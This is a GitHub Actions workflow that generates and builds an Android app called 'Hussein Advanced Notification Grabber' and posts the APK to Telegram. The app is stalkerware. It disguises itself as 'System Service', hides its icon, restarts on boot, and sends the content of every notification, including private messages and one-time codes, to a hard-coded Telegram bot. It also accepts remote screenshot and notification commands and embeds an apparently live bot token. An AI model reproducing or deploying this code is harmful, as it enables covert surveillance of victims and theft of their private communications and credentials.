name: Hussein Advanced Notification Grabber

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build-advanced-notification-app:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🔧 Install Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y gradle

      - name: 🛠️ Create Advanced Project Structure
        run: |
          mkdir -p app/src/main/java/com/hussein/advanced
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/xml
          mkdir -p gradle/wrapper

          # إعداد Gradle Wrapper بالإصدار الصحيح
          cat <<EOF > gradle/wrapper/gradle-wrapper.properties
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-all.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF

          # settings.gradle
          cat <<EOF > settings.gradle
          rootProject.name = 'HusseinAdvanced'
          include ':app'
          EOF

          # Root build.gradle محدث
          cat <<EOF > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          
          tasks.register('clean', Delete) {
              delete rootProject.buildDir
          }
          EOF

          # App build.gradle محدث
          cat <<EOF > app/build.gradle
          plugins {
              id 'com.android.application'
          }
          
          android {
              namespace 'com.hussein.advanced'
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.hussein.advanced"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "2.0"
                  
                  testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
              }
              
              buildTypes {
                  release {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
                  debug {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }
              
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
              implementation 'com.fasterxml.jackson.core:jackson-databind:2.16.1'
              implementation 'androidx.security:security-crypto:1.1.0-alpha06'
              implementation 'androidx.core:core:1.12.0'
          }
          EOF

          # ProGuard rules
          cat <<EOF > app/proguard-rules.pro
          -keep class com.hussein.advanced.** { *; }
          -keep class okhttp3.** { *; }
          -keep class com.fasterxml.jackson.** { *; }
          -dontwarn okhttp3.**
          -dontwarn okio.**
          -dontwarn com.fasterxml.jackson.**
          -keepclassmembers class **.R$* { public static <fields>; }
          EOF

          # AndroidManifest.xml
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
                  android:maxSdkVersion="28" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
              
              <application
                  android:allowBackup="false"
                  android:icon="@drawable/ic_launcher"
                  android:label="System Service"
                  android:theme="@style/AppTheme"
                  android:usesCleartextTraffic="true"
                  android:persistent="true"
                  android:requestLegacyExternalStorage="true"
                  tools:replace="android:allowBackup">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleTask"
                      android:excludeFromRecents="true"
                      android:noHistory="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  
                  <service
                      android:name=".AdvancedNotificationService"
                      android:label="System Monitor"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true"
                      android:foregroundServiceType="dataSync">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
                  
                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      android:enabled="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                      </intent-filter>
                  </receiver>
                  
              </application>
          </manifest>
          EOF

          # MainActivity.java
          cat <<EOF > app/src/main/java/com/hussein/advanced/MainActivity.java
          package com.hussein.advanced;
          
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.PowerManager;
          import android.provider.Settings;
          import androidx.core.app.NotificationManagerCompat;
          
          public class MainActivity extends Activity {
              
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  // تشغيل الخدمة
                  startService(new Intent(this, AdvancedNotificationService.class));
                  
                  // طلب الصلاحيات
                  requestAllPermissions();
                  
                  // إخفاء التطبيق
                  hideAppIcon();
                  
                  // إنهاء النشاط
                  finish();
              }
              
              private void requestAllPermissions() {
                  // صلاحية الإشعارات
                  if (!NotificationManagerCompat.getEnabledListenerPackages(this)
                          .contains(getPackageName())) {
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  }
                  
                  // تجاهل توفير البطارية
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      Intent intent = new Intent();
                      String packageName = getPackageName();
                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                      if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                          intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                          intent.setData(Uri.parse("package:" + packageName));
                          startActivity(intent);
                      }
                  }
              }
              
              private void hideAppIcon() {
                  PackageManager p = getPackageManager();
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  p.setComponentEnabledSetting(componentName, 
                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                      PackageManager.DONT_KILL_APP);
              }
          }
          EOF

          # AdvancedNotificationService.java
          cat <<EOF > app/src/main/java/com/hussein/advanced/AdvancedNotificationService.java
          package com.hussein.advanced;
          
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.PendingIntent;
          import android.content.Intent;
          import android.graphics.Bitmap;
          import android.graphics.drawable.Icon;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.util.Base64;
          import android.util.Log;
          
          import org.json.JSONObject;
          
          import java.io.ByteArrayOutputStream;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.HashSet;
          import java.util.Locale;
          import java.util.Set;
          import java.util.concurrent.TimeUnit;
          
          import okhttp3.MediaType;
          import okhttp3.MultipartBody;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;
          
          public class AdvancedNotificationService extends NotificationListenerService {
              private static final String TAG = "HusseinAdvanced";
              private static final String TELEGRAM_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private static final String CHAT_ID = "7392262688";
              private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
              
              private OkHttpClient client;
              private Handler handler;
              private Set<String> sentNotifications = new HashSet<>();
              private long lastUpdateId = 0;
              
              @Override
              public void onCreate() {
                  super.onCreate();
                  
                  client = new OkHttpClient.Builder()
                      .connectTimeout(30, TimeUnit.SECONDS)
                      .writeTimeout(30, TimeUnit.SECONDS)
                      .readTimeout(30, TimeUnit.SECONDS)
                      .build();
                  
                  handler = new Handler(Looper.getMainLooper());
                  
                  // بدء الخدمة الأمامية
                  startForegroundService();
                  
                  // بدء الاستماع لأوامر التليجرام
                  startListeningForCommands();
                  
                  Log.d(TAG, "Service started");
                  sendToTelegram("✅ System Monitor Started");
              }
              
              private void startForegroundService() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel(
                          "monitor_channel",
                          "System Monitor",
                          NotificationManager.IMPORTANCE_LOW
                      );
                      
                      NotificationManager manager = getSystemService(NotificationManager.class);
                      manager.createNotificationChannel(channel);
                      
                      Notification notification = new Notification.Builder(this, "monitor_channel")
                          .setContentTitle("System Monitor")
                          .setContentText("Running")
                          .setSmallIcon(android.R.drawable.ic_dialog_info)
                          .setPriority(Notification.PRIORITY_LOW)
                          .build();
                      
                      startForeground(1, notification);
                  }
              }
              
              private void startListeningForCommands() {
                  handler.postDelayed(new Runnable() {
                      @Override
                      public void run() {
                          checkTelegramCommands();
                          handler.postDelayed(this, 5000);
                      }
                  }, 5000);
              }
              
              private void checkTelegramCommands() {
                  new Thread(() -> {
                      try {
                          String url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + 
                              "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
                          
                          Request request = new Request.Builder()
                              .url(url)
                              .get()
                              .build();
                          
                          Response response = client.newCall(request).execute();
                          String responseBody = response.body().string();
                          
                          JSONObject json = new JSONObject(responseBody);
                          if (json.getBoolean("ok")) {
                              var result = json.getJSONArray("result");
                              for (int i = 0; i < result.length(); i++) {
                                  JSONObject update = result.getJSONObject(i);
                                  lastUpdateId = update.getLong("update_id");
                                  
                                  if (update.has("message")) {
                                      JSONObject message = update.getJSONObject("message");
                                      String text = message.optString("text", "");
                                      
                                      if (text.startsWith("/")) {
                                          handleCommand(text);
                                      }
                                  }
                              }
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Error checking commands: " + e.getMessage());
                      }
                  }).start();
              }
              
              private void handleCommand(String command) {
                  Log.d(TAG, "Command: " + command);
                  
                  switch (command.toLowerCase()) {
                      case "/start":
                          sendToTelegram("✅ System Monitor Active\n\nCommands:\n/notifications - Show status\n/screenshot - Take screenshot\n/help - Show help");
                          break;
                          
                      case "/screenshot":
                          takeScreenshot();
                          break;
                          
                      case "/help":
                          sendToTelegram("Available Commands:\n/start - Start service\n/notifications - Status\n/screenshot - Take screenshot\n/help - This message");
                          break;
                          
                      default:
                          if (command.startsWith("/send ")) {
                              String msg = command.substring(6);
                              showCustomNotification(msg);
                          }
                          break;
                  }
              }
              
              private void takeScreenshot() {
                  try {
                      Process process = Runtime.getRuntime().exec("screencap -p /sdcard/screenshot.png");
                      process.waitFor();
                      
                      sendToTelegram("✅ Screenshot taken and saved to /sdcard/screenshot.png");
                  } catch (Exception e) {
                      sendToTelegram("❌ Screenshot failed: " + e.getMessage());
                  }
              }
              
              private void showCustomNotification(String message) {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      Notification notification = new Notification.Builder(this, "monitor_channel")
                          .setContentTitle("System Message")
                          .setContentText(message)
                          .setSmallIcon(android.R.drawable.ic_dialog_info)
                          .build();
                      
                      NotificationManager manager = getSystemService(NotificationManager.class);
                      manager.notify(2, notification);
                      
                      sendToTelegram("✅ Notification sent to device: " + message);
                  }
              }
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String key = sbn.getKey();
                  
                  if (sentNotifications.contains(key)) {
                      return;
                  }
                  sentNotifications.add(key);
                  
                  handler.postDelayed(() -> sentNotifications.remove(key), 300000);
                  
                  try {
                      String packageName = sbn.getPackageName();
                      Notification notification = sbn.getNotification();
                      Bundle extras = notification.extras;
                      
                      String title = extras.getString(Notification.EXTRA_TITLE, "");
                      String text = extras.getString(Notification.EXTRA_TEXT, "");
                      
                      if (title.isEmpty() && text.isEmpty()) {
                          return;
                      }
                      
                      String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                      String appName = getAppName(packageName);
                      
                      String message = String.format("🔔 %s\n📱 %s\n📌 %s\n💬 %s\n⏰ %s", 
                          "New Notification", appName, title, text, time);
                      
                      sendToTelegram(message);
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error: " + e.getMessage());
                  }
              }
              
              private void sendToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          JSONObject payload = new JSONObject();
                          payload.put("chat_id", CHAT_ID);
                          payload.put("text", message);
                          
                          RequestBody body = RequestBody.create(payload.toString(), JSON);
                          Request request = new Request.Builder()
                              .url("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage")
                              .post(body)
                              .build();
                          
                          client.newCall(request).execute();
                          
                      } catch (Exception e) {
                          Log.e(TAG, "Send error: " + e.getMessage());
                      }
                  }).start();
              }
              
              private String getAppName(String packageName) {
                  try {
                      PackageManager pm = getPackageManager();
                      return pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString();
                  } catch (Exception e) {
                      return packageName;
                  }
              }
          }
          EOF

          # BootReceiver.java
          cat <<EOF > app/src/main/java/com/hussein/advanced/BootReceiver.java
          package com.hussein.advanced;
          
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          
          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      Intent serviceIntent = new Intent(context, AdvancedNotificationService.class);
                      context.startService(serviceIntent);
                  }
              }
          }
          EOF

          # styles.xml
          cat <<EOF > app/src/main/res/values/styles.xml
          <resources>
              <style name="AppTheme" parent="android:Theme.Material.Light.NoActionBar">
                  <item name="android:windowBackground">@android:color/transparent</item>
                  <item name="android:windowIsTranslucent">true</item>
                  <item name="android:windowNoTitle">true</item>
              </style>
          </resources>
          EOF

          # ic_launcher.xml
          cat <<EOF > app/src/main/res/drawable/ic_launcher.xml
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#FF0000"/>
              <corners android:radius="10dp"/>
          </shape>
          EOF

      - name: 🔧 Setup Gradle
        run: |
          chmod +x gradlew
          ./gradlew --version

      - name: 🏗️ Build APK
        run: |
          # تنظيف
          ./gradlew clean
          
          # بناء APK
          ./gradlew assembleDebug --stacktrace || true
          
          # البحث عن APK
          find app/build/outputs -name "*.apk" -exec ls -la {} \;
          
          # نسخ APK إذا وجد
          if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
            cp app/build/outputs/apk/debug/app-debug.apk Hussein_Advanced.apk
          fi

      - name: 📤 Send To Telegram
        run: |
          # البحث عن APK
          APK_FILE=$(find . -name "*.apk" -type f | head -n 1)
          
          if [ ! -z "$APK_FILE" ] && [ -f "$APK_FILE" ]; then
            # رسالة النجاح
            MESSAGE="✅ <b>تم بناء التطبيق بنجاح!</b>%0A%0A"
            MESSAGE+="👤 <b>المطور:</b> حسين%0A"
            MESSAGE+="📱 <b>الإصدار:</b> 2.0%0A"
            MESSAGE+="⚡ <b>المميزات:</b>%0A"
            MESSAGE+="• سحب الإشعارات%0A"
            MESSAGE+="• التحكم عبر التليجرام%0A"
            MESSAGE+="• تشغيل تلقائي%0A"
            MESSAGE+="• إخفاء التطبيق%0A%0A"
            MESSAGE+="📋 <b>الأوامر:</b>%0A"
            MESSAGE+="/start - بدء الخدمة%0A"
            MESSAGE+="/screenshot - تصوير الشاشة%0A"
            MESSAGE+="/send [نص] - إرسال إشعار%0A"
            MESSAGE+="/help - المساعدة"
            
            # إرسال الرسالة
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=$MESSAGE" -d "parse_mode=HTML"
            
            # إرسال الملف
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
              -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -F "document=@$APK_FILE" \
              -F "caption=📦 Hussein Advanced v2.0"
            
            echo "✅ تم الإرسال"
          else
            # رسالة الخطأ
            MESSAGE="❌ <b>خطأ في البناء</b>%0A%0A"
            MESSAGE+="يرجى التحقق من logs"
            
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=$MESSAGE" -d "parse_mode=HTML"
          fi
